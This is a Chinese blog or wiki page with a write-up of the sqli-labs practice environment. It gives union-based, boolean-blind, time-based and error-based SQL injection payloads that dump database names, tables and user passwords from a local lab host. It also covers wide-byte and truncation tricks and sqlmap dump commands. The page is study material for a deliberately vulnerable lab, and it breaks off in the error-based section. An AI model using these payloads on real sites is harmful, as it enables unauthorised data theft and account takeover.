<!DOCTYPE html>
<html lang="zh-cn">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          Sqli-labs系列write-up - 信息安全个人wiki&amp;blog
        
    </title>

    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

<meta name="generator" content="Hexo 4.2.1"></head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>信息安全个人WIKI&amp;BLOG</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
<li><a href="/about">About</a></li>
<li><a href="/note">Notes</a></li>
</ul>
<h1 id="web安全"><a href="#web安全" class="headerlink" title="web安全"></a><strong>web安全</strong></h1><h3 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h3><ul>
<li><a href="/contents/xss">WebSecurity-xss</a></li>
<li><a href="/contents/csrf">WebSecurity-csrf</a></li>
<li><a href="/contents/ssrf">WebSecurity-ssrf</a></li>
<li><a href="/contents/FI">WebSecurity-FI</a></li>
<li><a href="/contents/rce">WebSecurity-rce</a></li>
<li><a href="/contents/upload">WebSecurity-upload</a></li>
<li><a href="/contents/xxe">WebSecurity-xxe</a></li>
</ul>
<h2 id="labs"><a href="#labs" class="headerlink" title="labs"></a>labs</h2><ul>
<li><a href="/contents/xsslabs">xss-demo项目练习</a></li>
<li><a href="/contents/sqllabs">sql-labs项目练习</a></li>
<li><a href="/contents/uploadlabs">upload-labs系列write-up</a></li>
<li><a href="/contents/code-breaking">code-breaking write-up</a></li>
</ul>
<h2 id="CTF-amp-AWD"><a href="#CTF-amp-AWD" class="headerlink" title="CTF&amp;AWD"></a>CTF&amp;AWD</h2><ul>
<li><a href="/contents/awd">百越杯AWD攻防源码复现分析</a></li>
<li><a href="/contents/jarvis">Jarvis oj web部分write-up</a></li>
<li><a href="/contents/babyphp">hacklu_CTF2018 write up</a></li>
<li><a href="/contents/suctf">suctf招新赛web全题解</a></li>
<li><a href="/contents/shanghai">骇极杯CTF Write up</a></li>
<li><a href="/contents/wangding">2018网鼎杯web部分write-up合集</a></li>
</ul>
<h2 id="实战-amp-总结"><a href="#实战-amp-总结" class="headerlink" title="实战&amp;总结"></a>实战&amp;总结</h2><ul>
<li><a href="/contents/login">登录框渗透总结</a></li>
<li><a href="/contents/logic">登录逻辑漏洞总结</a></li>
<li><a href="/contents/unauthorized">未授权访问渗透总结</a></li>
<li><a href="/contents/mysql-fileread">mysql客户端读取漏洞</a></li>
</ul>
<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a><strong>内网渗透</strong></h1><ul>
<li>待补充</li>
</ul>
<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a><strong>代码审计</strong></h1><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><ul>
<li><a href="/contents/variable">代码审计基础之变量覆盖漏洞</a></li>
<li><a href="/contents/injection">代码审计基础之命令注入函数</a></li>
<li><a href="/contents/serialize">代码审计基础之php反序列化</a></li>
</ul>
<h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><ul>
<li>待补充</li>
</ul>
<h1 id="安全开发"><a href="#安全开发" class="headerlink" title="安全开发"></a><strong>安全开发</strong></h1><ul>
<li><a href="/contents/tools">一些工具的使用命令</a></li>
</ul>

</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
  <div class="sidebar-toggle-inner"></div>
</div>

<script>
function add_inner() {
  let inner = document.querySelector('.sidebar-toggle-inner')
  inner.classList.add('show')  
}

function remove_inner() {
  let inner = document.querySelector('.sidebar-toggle-inner')
  inner.classList.remove('show')
}

function sidebar_toggle() {
    let sidebar_toggle = document.querySelector('.sidebar-toggle')
    let sidebar = document.querySelector('.book-sidebar')
    let content = document.querySelector('.off-canvas-content')
    if (sidebar_toggle.classList.contains('extend')) { // show
        sidebar_toggle.classList.remove('extend')
        sidebar.classList.remove('hide')
        content.classList.remove('extend')
    }
    else { // hide
        sidebar_toggle.classList.add('extend')
        sidebar.classList.add('hide')
        content.classList.add('extend')
    }
}
</script>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <p>为了不荒废时间每天可以学点东西。</p>
<p>我学起了sql注入</p>
<p>环境是<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">sqli-labs</a><a id="more"></a></p>
<hr>
<h2 id="什么是sql注入？"><a href="#什么是sql注入？" class="headerlink" title="什么是sql注入？"></a>什么是sql注入？</h2><p>所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令，起因于数据和代码的界限分割不明确。 </p>
<p>为了更直观的学习sql代码。</p>
<p>在每个源代码中都加入了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$result&#x3D;mysql_query($sql);</span><br><span class="line">echo &quot;&lt;br&gt;&quot;.&quot;&lt;br&gt;&quot;.&quot;&lt;br&gt;&quot;.$sql.&quot;&lt;br&gt;&quot;.&quot;&lt;br&gt;&quot;.&quot;&lt;br&gt;&quot;;</span><br></pre></td></tr></table></figure>

<h3 id="Less-1-基于错误的GET单引号字符型注入"><a href="#Less-1-基于错误的GET单引号字符型注入" class="headerlink" title="Less-1 基于错误的GET单引号字符型注入"></a>Less-1 基于错误的GET单引号字符型注入</h3><h5 id="基础知识："><a href="#基础知识：" class="headerlink" title="基础知识："></a>基础知识：</h5><p><img src="/img/sql_2.png" alt=""></p>
<ul>
<li><p>Limit 0,1的意思是从第零行开始 显示一行数据</p>
</li>
<li><p><code>#</code>号(%23)的意义在于注释掉后面的’使前面的单引号可以闭合 同样的还有<code>--+</code></p>
</li>
<li><p>如图这个表一共有3列 每行有三个字段order by 这里爆出的字段即为数据库的列数</p>
</li>
<li><p><code>-1</code>的作用在于知道当前查询字段在第几列，方便后续的查询与显示</p>
</li>
<li><p>Mysql中Union的作用是将前后两次查询的结果合并成为一张表 如图</p>
</li>
</ul>
<p><img src="/img/sql_1.png" alt=""></p>
<h5 id="开日"><a href="#开日" class="headerlink" title="开日"></a>开日</h5><ol>
<li><p>判断字段长度</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?id=1'order by 4 --+</span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">SELECT * FROM users WHERE id='1'order by 4 -- ' LIMIT 0,1</span><br><span class="line"></span><br><span class="line">Unknown column '4' in 'order clause'</span><br></pre></td></tr></table></figure>

<p>可知只有3个字段</p>
</li>
<li><p>查库</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?id=-1'  union select 1,2,concat_ws(char(32,32),user(),database()) --+</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">SELECT * FROM users WHERE id='-1' union select 1,2,concat_ws(char(32,32),user(),database()) -- ' LIMIT 0,1</span><br><span class="line"></span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:root@localhost security</span><br></pre></td></tr></table></figure>

<p>库名为security</p>
<p>笔记</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- concat_ws(char(32,58,32),user(),database(),version()) 当前用户，当前数据库名，当前数据库版本</span><br><span class="line">- Mysql中的information_scherma从字面上来说是信息计划表。这里面包括了所有的库，表，列  有3特别重要的表</span><br></pre></td></tr></table></figure>
</li>
<li><p>查表</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?id=-1' union select 1,TABLE_SCHEMA,group_concat(table_name) from information_schema.tables where table_schema like 'security'--+</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">SELECT * FROM users WHERE id='-1' union select 1,TABLE_SCHEMA ,group_concat(table_name) from information_schema.tables where table_schema like 'security'-- ' LIMIT 0,1</span><br><span class="line"></span><br><span class="line">Your Login name:security</span><br><span class="line">Your Password:emails,referers,uagents,users</span><br></pre></td></tr></table></figure>

<p>做个笔记</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- SCHEMATA表：提供了当前mysql实例中所有数据库的信息。 命令show databases;的结果取之此表。</span><br><span class="line">- TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。 命令show tables from schemaname的结果取之此表。</span><br><span class="line">- COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。命令show columns from schemaname.tablename的结果取之此表。</span><br></pre></td></tr></table></figure>
</li>
<li><p>查列</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where  table_name='users' --+</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">SELECT * FROM users WHERE id='-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' -- ' LIMIT 0,1</span><br><span class="line"></span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:id,username,password</span><br></pre></td></tr></table></figure>

<p>得到三个字段名，与之前在mysql那儿得到的一样</p>
<p>继续做个笔记</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- 爆所有数据名： select group_concat(SCHEMA_NAME) from information_schema.schemata;</span><br><span class="line"></span><br><span class="line">- 得到当前库的所有表：select group_concat(table_name) from information_schema.tables where table_schema=database();  </span><br><span class="line"></span><br><span class="line">- 得到表中所有的字段名：select group_concat(column_name) from information_schema.columns where table_name='table_name' ;  </span><br><span class="line"></span><br><span class="line">- 得到字段具体的值：select group_concat(column_name,' ',column_name) from table_name;</span><br></pre></td></tr></table></figure>
</li>
<li><p>查值</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?id=-1' union select 1,2,group_concat(username,' ',password) from users --+</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">SELECT * FROM users WHERE id='-1' union select 1,2,group_concat(username,' ',password) from users -- ' LIMIT 0,1</span><br><span class="line"></span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:Dumb Dumb,Angelina I-kill-you,Dummy p@ssword,secure crappy,stupid stupidity,superman genious,batman mob!le,admin admin,admin1 admin1,admin2 admin2,admin3 admin3,dhakkan dumbo,admin4 admin4</span><br></pre></td></tr></table></figure>


</li>
</ol>
<h3 id="Less-2-基于错误的GET整型注入"><a href="#Less-2-基于错误的GET整型注入" class="headerlink" title="Less-2 基于错误的GET整型注入"></a>Less-2 基于错误的GET整型注入</h3><p>先加个’尝试一下</p>
<p><img src="/img/sql_3.png" alt=""></p>
<p>可以看到1前并没有’ 这是数字型得出后台SQL语句应该是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from table_name where id &#x3D; $_get[‘id’] limit 0,1</span><br></pre></td></tr></table></figure>

<p>于是构造-1 or 1=1。</p>
<p>尝试<code>order by</code> 和<code>-1 UNION SELECT 1,concat_ws(char(32,58,32),user(),database(),version()),3</code><br>之后的就跟less-1一样了</p>
<p><img src="/img/sql_4.png" alt=""></p>
<h3 id="Less-3-基于错误的GET单引号变形字符型注入"><a href="#Less-3-基于错误的GET单引号变形字符型注入" class="headerlink" title="Less-3 基于错误的GET单引号变形字符型注入"></a>Less-3 基于错误的GET单引号变形字符型注入</h3><p>先加个’尝试一下</p>
<p><img src="/img/sql_5.png" alt=""></p>
<p>可以看到这是带括号的字符型,那么就可以通过<code>&#39;)</code> 和<code>%23</code>来绕过</p>
<p>得出后台SQL是 :</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from table_name where id =(‘$_get[‘id’]’)limit 0,1</span><br></pre></td></tr></table></figure>

<p>其他步骤和1，2一样~</p>
<p><img src="/img/sql_6.png" alt=""></p>
<h3 id="Less-4-基于错误的GET双引号变形字符型注入"><a href="#Less-4-基于错误的GET双引号变形字符型注入" class="headerlink" title="Less-4 基于错误的GET双引号变形字符型注入"></a>Less-4 基于错误的GET双引号变形字符型注入</h3><p>先加个’尝试一下</p>
<p><img src="/img/sql_7.png" alt=""></p>
<p>其带了括号和双引号，可以通过<code>&quot;)</code>和 <code>%23</code>来绕过</p>
<p>具体payload：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1") union  SELECT 1,2,group_concat(username,' ',password) from users  %23</span><br></pre></td></tr></table></figure>

<h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><p>不太会用，贴上一些简单的用法，以后常更。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u “URL” --current -db  查看当前数据库。</span><br><span class="line">Sqlmap -u “URL” -D 数据库名 –tables --dump 查看数据库中的表</span><br><span class="line">sqlmap -u “URL” -D 数据库名 –T 表名 –columns  --dump查看数据库中的表中的列</span><br><span class="line">Sqlmap -u “URL” -D 数据库名 –T 表名 –C 列名 --dump 查看列的内容。</span><br><span class="line">eg. sqlmap -u http://192.168.86.134/sqli-labs-master/Less-1/?id=1 --dump</span><br></pre></td></tr></table></figure>

<h3 id="others"><a href="#others" class="headerlink" title="others"></a>others</h3><h5 id="宽字节注入："><a href="#宽字节注入：" class="headerlink" title="宽字节注入："></a>宽字节注入：</h5><p><a href="https://www.jianshu.com/p/84ba21e0eabc" target="_blank" rel="noopener">参考链接</a></p>
<p><code>id=1%df&#39; and 1=2 #</code>  </p>
<p><code>tabale_name</code> 要用<code>0x</code>表示</p>
<h5 id="sprintf格式化字符串："><a href="#sprintf格式化字符串：" class="headerlink" title="sprintf格式化字符串："></a>sprintf格式化字符串：</h5><p><a href="https://blog.csdn.net/nzjdsds/article/details/82156123" target="_blank" rel="noopener">参考链接</a></p>
<p><code>id=1%1$&#39; and 1=2 #</code></p>
<p>原理都是和构造语句，闭合单引号进行逃逸</p>
<h5 id="sql约束攻击："><a href="#sql约束攻击：" class="headerlink" title="sql约束攻击："></a>sql约束攻击：</h5><p><a href="http://www.freebuf.com/column/179817.html" target="_blank" rel="noopener">参考链接</a></p>
<p>注册</p>
<p><code>admin                                                                         1</code></p>
<p>密码随意，可以造成<code>admin</code>任意用户登录</p>
<h2 id="盲注及其分类"><a href="#盲注及其分类" class="headerlink" title="盲注及其分类"></a>盲注及其分类</h2><h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><p>首先，什么是盲注呢？在mysql注入天书中是这样解释的：”盲注就是在sql注入过程中，sql语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。 “ 那么我们便可以通过对错来下手</p>
<h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><ul>
<li>基于布尔的盲注（构造逻辑判断）<ul>
<li>利用left()、length()函数    </li>
<li>利用substr()、ascii()函数  </li>
<li>利用regexp   </li>
<li>利用ord()、mid()函数</li>
</ul>
</li>
<li>基于时间的盲注（延时注入）<ul>
<li>sleep()函数 </li>
<li>benchmark()函数</li>
</ul>
</li>
<li>基于报错的盲注（构造payload让信息通过错误提示回显）<ul>
<li>concat()、floor()、rand()、group by</li>
<li>exp()</li>
<li>bigint</li>
<li>extractvalue()</li>
<li>updatexml()</li>
<li>重复特性</li>
</ul>
</li>
</ul>
<p>其中left() ascii() sleep() rand() 这几个类型是重点学习对象，先来了解常用函数</p>
<h4 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h4><h5 id="ascii函数"><a href="#ascii函数" class="headerlink" title="ascii函数"></a>ascii函数</h5><p>返回字符的ASCII值</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii('a')=97</span><br></pre></td></tr></table></figure>

<h5 id="substr-mid函数"><a href="#substr-mid函数" class="headerlink" title="substr,mid函数"></a>substr,mid函数</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr('security',1,1)=s</span><br></pre></td></tr></table></figure>

<h5 id="left-length函数"><a href="#left-length函数" class="headerlink" title="left,length函数"></a>left,length函数</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">left('security',1)='s'</span><br><span class="line">length('security')=8</span><br></pre></td></tr></table></figure>

<h5 id="sleep函数"><a href="#sleep函数" class="headerlink" title="sleep函数"></a>sleep函数</h5><p>延时多少秒才发生响应</p>
<h5 id="count函数"><a href="#count函数" class="headerlink" title="count函数"></a>count函数</h5><p>统计元祖个数</p>
<h5 id="rand函数"><a href="#rand函数" class="headerlink" title="rand函数"></a>rand函数</h5><p>产生一个0-1的数</p>
<h5 id="floor函数"><a href="#floor函数" class="headerlink" title="floor函数"></a>floor函数</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">floor(1.1123456)=1</span><br></pre></td></tr></table></figure>

<h5 id="concat函数"><a href="#concat函数" class="headerlink" title="concat函数"></a>concat函数</h5><p>将符合条件的同一列的不同行进行拼接 </p>
<p>基本上就是这些函数了，下面就开始疯狂日Less-5了嘻嘻嘻</p>
<h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><h4 id="基于布尔"><a href="#基于布尔" class="headerlink" title="基于布尔"></a>基于布尔</h4><h5 id="ascii-substr"><a href="#ascii-substr" class="headerlink" title="ascii substr"></a>ascii substr</h5><p>输入<code>id=1&#39;</code>报错 </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id='1'' LIMIT 0,1 </span><br><span class="line">the right syntax to use near ''1'' LIMIT 0,1' at line 1</span><br></pre></td></tr></table></figure>

<p>说明sql语句中对id的处理为<code>id=&#39;1&#39;</code> ，同时若结果返回正常时有注入点<code>You are in...........</code> </p>
<p>这时我们便可以构造盲注了</p>
<ol>
<li><p>查数据库</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.134/sqli-labs-master/Less-5/?id=1' and ascii(substr((select database()),1,1))&gt;114 %23</span><br></pre></td></tr></table></figure>

<p>返回<code>You are in...........</code> </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.134/sqli-labs-master/Less-5/?id=1' and ascii(substr((select database()),1,1))&gt;115 %23</span><br></pre></td></tr></table></figure>

<p>无返回值 这里我们知道了database第一个值的ascii码为115 即‘s’ 同理变换后面的数字即可猜出其他ascii码值，最后获得数据库名为：<code>security</code></p>
</li>
<li><p>查表</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.134/sqli-labs-master/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100 %23</span><br></pre></td></tr></table></figure>

<p>这里变换limit就可以猜出各个表名，得到一个表为：<code>users</code></p>
</li>
<li><p>查列</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.134/sqli-labs-master/Less-5/?id=1' and ascii(substr((select column_name from information_schema.columns where table_name="users" limit 0,1),1,1))&gt;104 %23</span><br></pre></td></tr></table></figure>

<p>变换limit后面的0为1，2可查到一个三个列：<code>id  username  password</code></p>
</li>
<li><p>查值</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.134/sqli-labs-master/Less-5/?id=1' and ascii(substr((select username from security.users order by id limit 0,1),1,1))&gt;67 %23</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h5 id="left-length"><a href="#left-length" class="headerlink" title="left length"></a>left length</h5><ol>
<li><p>判断数据库长度</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.134/sqli-labs-master/Less-5/?id=1' and 1=(length(database())<span class="tag">&lt;<span class="name">8)</span> %<span class="attr">23</span></span></span><br></pre></td></tr></table></figure>
</li>
<li><p>查数据库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.86.134&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39;  and 1&#x3D;(left(database(),8)&#x3D;&#39;security&#39;) %23</span><br></pre></td></tr></table></figure>
</li>
<li><p>查表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.86.134&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and 1&#x3D;(left((select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1),1)&#x3D;&#39;u&#39;) %23</span><br></pre></td></tr></table></figure>
</li>
<li><p>查列</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.86.134&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and 1&#x3D;(left((select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39; limit 0,1),1)&#x3D;&#39;i&#39;) %23</span><br></pre></td></tr></table></figure>
</li>
<li><p>查值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.86.134&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and 1&#x3D;(left((select username from security.users limit 0,1),1)&#x3D;&#39;D&#39;) %23</span><br></pre></td></tr></table></figure>

<p>这里有个小坑就是查出来的值不分大小写，所以最好用ascii</p>
</li>
</ol>
<h5 id="regexp-正则"><a href="#regexp-正则" class="headerlink" title="regexp(正则)"></a>regexp(正则)</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.134/sqli-labs-master/Less-5/?id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^us[a-z]' limit 0,1) %23</span><br></pre></td></tr></table></figure>

<p>查寻user表里有没有us**的列，这一部分没太弄懂，以后继续更</p>
<h4 id="基于时间"><a href="#基于时间" class="headerlink" title="基于时间"></a>基于时间</h4><p>也称延时注入~</p>
<h5 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h5><ol>
<li><p>查数据库</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.134/sqli-labs-master/Less-5/?id=1'  and if ((ascii(substr(database(),1,1))=115),1,sleep(5)) %23</span><br></pre></td></tr></table></figure>

<p>正确返回<code>You are in...........</code> 错误延时5秒且无回显，当然你也可以调换sleep的位置方便查</p>
</li>
<li><p>查表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.86.134&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if ((ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),1,1))&#x3D;101),1,sleep(5))%23</span><br></pre></td></tr></table></figure>
</li>
<li><p>查列</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.86.134&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if ((ascii(substr((select column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; limit 0,1),1,1))&#x3D;105),1,sleep(5))%23</span><br></pre></td></tr></table></figure>
</li>
<li><p>查值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.86.134&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if ((ascii(substr((select username from security.users limit 0,1),1,1))&#x3D;68),1,sleep(5))%23</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h4 id="基于报错"><a href="#基于报错" class="headerlink" title="基于报错"></a>基于报错</h4><p>基于报错这种方式是一种双注入查询</p>
<h5 id="什么是双注入？"><a href="#什么是双注入？" class="headerlink" title="什么是双注入？"></a>什么是双注入？</h5><p>在了解双注入前先看看子查询，举个简单的例子：<code>SELECT floor(rand()*2);</code>简单来说就是函数嵌套，先运行rand()函数，再floor一下，最后得到的结果只有1和0类似的还有</p>
<p><code>SELECT CONCAT((SELECT database()), FLOOR(RAND()*2))</code>结果为security1和security0</p>
<p>接下来我们在这上面进行变动</p>
<p><code>SELECT CONCAT((SELECT database()), FLOOR(RAND()*2)) from users</code>返回13个security1和security0</p>
<p><code>select concat((select database()), floor(rand()*2))as a from information_schema.tables group by a</code>  这里给这个分组取了个别名叫做 a 然后用他进行分组 security0和security1各为一组</p>
<h5 id="构造报错语句"><a href="#构造报错语句" class="headerlink" title="构造报错语句"></a>构造报错语句</h5><p>重点来了，我们在concat前面加个count(*)</p>
<p><code>select count(*), concat((select database()), floor(rand()*2))as a from information_schema.tables group by a;</code> 报错了，并且返回了一个security1这正是我们想要的值</p>
<p><img src="/img/sql_8.png" alt=""></p>
<p>那么为什么他会报错呢？</p>
<h5 id="报错原理"><a href="#报错原理" class="headerlink" title="报错原理"></a>报错原理</h5><p>问题就在于count(*)调用group by的时候会出错 具体出错原理如下首先  group by 建立函数分组的时候首先会建立一张虚拟的空表然后开始查询数据库取出数据库数据看虚拟表中是否存在。不存在则将要分组的数据插入虚拟表中以待最后输出，存在则count++。<br>而rand这个函数在使用group by分组的时候会计算一次count。倘若虚拟表中无该字段，则插入表中的时候再次计算一次count。<br>那就会出现刚开始判断表中无0 而在插入的时候重新计算变成了1 就会出现两个数据重复而报错  这便是关键<br>另外 floor(rand()2)函数出来的值是无规律的而floor(rand(0)2)是有规律的为011011001110111……</p>
<h5 id="开日-1"><a href="#开日-1" class="headerlink" title="开日"></a>开日</h5><ol>
<li><p>查数据库</p>
